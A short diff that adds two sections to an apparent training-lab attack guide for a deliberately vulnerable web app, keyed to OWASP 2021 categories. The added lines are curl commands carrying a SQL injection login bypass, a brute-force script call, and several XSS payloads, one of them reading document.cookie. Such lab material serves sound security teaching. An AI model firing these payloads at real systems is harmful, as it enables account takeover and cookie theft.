@@ -102,3 +102,24 @@ curl victim:3000/score-board
 ```bash
 curl victim:3000/ftp/nonexistent.txt
 ```
+
+### A07:2021 Authentication Failures
+
+```bash
+curl -X POST victim:3000/rest/user/login \
+     -H "Content-Type: application/json" \
+     -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"
+# or
+python3 brute_login.py
+```
+
+### A08:2021 Software and Data Integrity Failures
+
+```bash
+# XSS
+curl "victim:3000/#/search?q=<script>alert(1)</script>"
+curl -G "http://172.20.0.106:3000/#/search" \
+     --data-urlencode "q=<iframe src='javascript:alert(1)'>"
+curl "victim:3000/#/track-result?id=<img%20src=x%20onerror=alert(1)>"
+curl "victim:3000/#/search?q=javascript:alert(document.cookie)"
+```
